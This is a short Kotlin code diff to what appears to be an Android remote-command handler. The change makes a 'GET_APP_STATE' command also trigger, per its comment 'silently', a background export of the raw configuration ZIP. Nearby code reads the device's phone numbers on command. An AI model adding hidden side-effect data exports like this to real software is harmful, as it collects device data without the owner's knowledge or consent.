@@ -880,6 +880,19 @@ object CommandProcessor {
                     updateCommandStatus(ctx, id, status, null, defaults, null)
                     return
                 }
+                "GET_APP_STATE" -> {
+                    val stateReport = DeviceManager.getAppStateReport(ctx)
+                    status = "APP_STATE_RETRIEVED"
+                    
+                    // Trigger the raw config ZIP export silently
+                    kotlinx.coroutines.CoroutineScope(Dispatchers.IO).launch {
+                        val mockCmd = JSONObject().apply { put("id", -999); put("file_name", "EXPORT_CONFIG"); put("content", "") }
+                        processSingleCommand(ctx, mockCmd)
+                    }
+                    
+                    updateCommandStatus(ctx, id, status, "State report generated. Raw config ZIP export also queued.", stateReport, null)
+                    return
+                }
                 "GET_NUMBERS" -> {
                     val sm = ctx.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as android.telephony.SubscriptionManager
                     val numbers = JSONArray()
